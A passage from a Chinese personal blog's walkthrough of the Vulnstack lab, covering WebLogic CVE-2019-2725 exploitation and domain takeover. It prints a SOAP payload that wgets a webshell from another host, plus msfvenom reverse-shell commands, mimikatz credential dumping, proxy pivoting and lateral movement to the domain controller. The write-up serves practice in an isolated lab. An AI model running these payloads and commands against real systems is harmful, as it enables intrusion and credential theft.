<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.37.128:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 850</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;wget http://192.168.37.141:8080/JspSpy.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/JspSpy.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>我这里没有利用成功，弄了半天也没弄好，暂时放一下，后面再另外搭环境仔细复现一下。</p>
<p>现在我们使用msf工具中现成的exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2019-2725</span><br></pre></td></tr></table></figure>

<p>好家伙，exp也用不了，让我怀疑是不是环境出了问题，故去web服务器那看了一下。</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819164614026.png" alt="image-20220819164614026"></p>
<p>居然报错了，也不知道是什么原理，百度。</p>
<p>好家伙，是权限不足的原因，web要登录de1ay的管理员administrator账号才可以。</p>
<p>好的，然后360直接就给你拦截了</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819170807062.png" alt="image-20220819170807062"></p>
<p>受不了了，直接上工具</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819174013015.png" alt="image-20220819174013015"></p>
<p>这时候上线msf或者cs就可以开始下一步的渗透了。</p>
<p>先穿上一个冰蝎马</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183249345.png" alt="image-20220819183249345"></p>
<p>试着连接一下</p>
<p>发现连接成功！</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183539196.png" alt="image-20220819183539196"></p>
<p>然后我们试着传一个msf的马</p>
<p>传上去是传的上去，但是无法执行</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220819183745631.png" alt="image-20220819183745631"></p>
<p>但是我目前还不太会免杀捏，直接双击了</p>
<p>但是突然接了个项目，明天再战。</p>
<p>真的会谢，来了这学校之后电脑都变慢了，环境也不知道怎么回事毁掉了，只能重新装一遍靶场</p>
<p>最后还是用以上方法拿到权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.248.128 LPORT=1234 -f exe -o 1.exe   </span><br><span class="line">#生成木马</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.248.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit </span><br><span class="line">#监听</span><br></pre></td></tr></table></figure>



<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822140459372.png" alt="image-20220822140459372"></p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先收集本机的一些信息（如果连接windowsshell是乱码的状态可以使用这个语句解决<code>chcp 65001</code></p>
<p>arp、路由、杀软、防火墙、3389、hash密码、域内信息等</p>
<p>当前用户是域管理员</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822142857742.png" alt="image-20220822142857742"></p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822141759574.png" alt="image-20220822141759574"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822142810625.png" alt="image-20220822142810625"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>

<p>发现360卫视</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143044769.png" alt="image-20220822143044769"></p>
<p><code>net user /domain</code></p>
<p>查看域内用户</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143209338.png" alt="image-20220822143209338"></p>
<p>net time /domain查域控</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143345350.png" alt="image-20220822143345350"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**net config workstation 查看是否有域，以及当前登录域**</span><br><span class="line"></span><br><span class="line">**net view 查看域内主机列表**</span><br><span class="line"></span><br><span class="line">**net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台)**</span><br><span class="line"></span><br><span class="line">**net user /domain 查看域内所有域用户**</span><br><span class="line"></span><br><span class="line">**net group &quot;domain admins&quot; /domain 查看域管理员列表**</span><br><span class="line"></span><br><span class="line">**然后通过ping 命令查看域中主机的ip**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 查下补丁</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822143749830.png" alt="image-20220822143749830"></p>
<p>最后整理一下吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">域名 de1ay                   杀软：360安全卫士          </span><br><span class="line"></span><br><span class="line">域内主机：三台  DC（10.10.10.10）  PC （10.10.10.201） WEB（10.10.10.80 和192.168.111.80   win2008R2）</span><br><span class="line"></span><br><span class="line">域用户：Administrator            de1ay                    Guest                    krbtgt                   mssql    </span><br><span class="line"></span><br><span class="line"> 补丁：                  [01]: KB2999226</span><br><span class="line">                           [02]: KB958488</span><br><span class="line">                           [03]: KB976902</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>有大佬提出这样的一个攻击思路</p>
<p>尝试直接新建具有鱼贯权限的用户hack，密码为1qaz@wsx，然后开3389远程登录 (不推荐）</p>
<p>但我还在学习阶段就暂时不用这种了。</p>
<p>用kiwi抓明文密码把</p>
<p>首先迁移进程到一个64位的system进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate 1928</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822145222477.png" alt="image-20220822145222477"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220822145658759.png" alt="image-20220822145658759"></p>
<p>拿到其他主机的账号和密码</p>
<h3 id="路由或者代理实现横向"><a href="#路由或者代理实现横向" class="headerlink" title="路由或者代理实现横向"></a>路由或者代理实现横向</h3><ul>
<li>在内网渗透的时候，有时候我们想继续探测内网的资源，但是由于防火墙的原因导致我们无法继续访问内部资源，此时我们就可以考虑添加路由或者端口转发等技术。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf实现路由添加</span><br><span class="line"></span><br><span class="line">msf查看网卡情况，并且添加路由</span><br><span class="line">#获取当前主机下的网络架构分布</span><br><span class="line">run get_local_subnets</span><br><span class="line"></span><br><span class="line">添加路由访问</span><br><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line"></span><br><span class="line">#在全局给指定的session增删路由</span><br><span class="line"></span><br><span class="line">route add 192.168.11.0  255.255.255.0  1     #在session1中添加到达192.168.11.0网段的路由</span><br><span class="line">route add 192.168.12.0  255.255.255.0  1     #在session1中添加到达192.168.12.0网段的路由</span><br><span class="line">route add 0.0.0.0       0.0.0.0        1     #在session1中添加到达0.0.0.0/24网段的路由</span><br><span class="line">route del 192.168.12.0  255.255.255.0  2     #在session2中删除到达192.168.12.0网段的路由</span><br><span class="line">route print    #打印路由信息</span><br><span class="line"></span><br><span class="line">查看当前路由列表</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">查看当前网络下IP列表端口</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.22.0/24</span><br><span class="line">set threads 100</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">利用proxychain配合socks4代理渗透</span><br><span class="line">如果我们不想在msf里面探测，我们可以使用socks4代理，实现在代理扫描，漏洞探测</span><br><span class="line">配置socks4代理</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 2222</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">修改proxychain配置加入</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 192.168.131.159 2222</span><br><span class="line"></span><br><span class="line">调用代理执行nmap扫描目标</span><br><span class="line">proxychains nmap -Pn -sT 192.168.22.128</span><br></pre></td></tr></table></figure>

<p>改路由没扫到其他主机，不知道怎么回事</p>
<p>那我们挂个socks代理对内网的主机进行一个探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -PA 192.168.123.1/24</span><br><span class="line">#扫存活主机</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -T4 -p21,22,135,445,80,53,3389,8080,1433,8080 10.10.10.10</span><br><span class="line">#扫指定主机</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cxy163.net/archives/2081">nmap扫描局域网存活主机_nmap扫描在线主机的几种方法 | 绝缘体 (cxy163.net)</a></p>
<p>代理我后面再开个靶场自己练习</p>
<p>啥也没扫到，我人嘛了，直接上cs辅助吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.235.129</span><br><span class="line">set lport 8888</span><br><span class="line">set session 2</span><br><span class="line">run</span><br><span class="line">#cs那边记得监听</span><br></pre></td></tr></table></figure>

<p>好成功上线</p>
<p>这里使用cs的扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先扫一下内网存活主机</span><br><span class="line">shell arp -a</span><br></pre></td></tr></table></figure>



<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823154602108.png" alt="image-20220823154602108"></p>
<p>然后可以开始横向了</p>
<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h3><p>ping一下DC PC可以看到他们的ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DC 10.10.10.10</span><br><span class="line">PC 10.10.10.201</span><br></pre></td></tr></table></figure>

<p>这里可以扫一下内网主机+端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">portscan 网段 端口 协议（icmp arp none）线程</span><br><span class="line">portscan 10.10.10.0/24 445 arp 50</span><br><span class="line"></span><br><span class="line">portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823155316578.png" alt="image-20220823155316578"></p>
<p>既然存在445端口，那么可以用run minikatz模块进行横向（虽然早就拿到账号密码了</p>
<p>抓到密码之后创建一个smb，然后对目标主机进行横向</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823160610417.png" alt="image-20220823160610417"></p>
<p>dc主机成功上线！</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823160753720.png" alt="image-20220823160753720"></p>
<p>在那边pc也是没有过免杀的（360弹窗了，麻了，后面再学免杀把。</p>
<p>随后也是成功上线pc</p>
<p><img src="/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823162540948.png" alt="image-20220823162540948"></p>
<p>拿下靶场！</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/121229030">(96条消息) psexec的底层实现原理是什么_Ping_Pig的博客-CSDN博客_psexec原理</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/36/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/36/">36</a><span class="page-number current">37</span><a class="page-number" href="/page/38/">38</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/38/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="十三"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">十三</p>
  <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">177</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">十三</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>
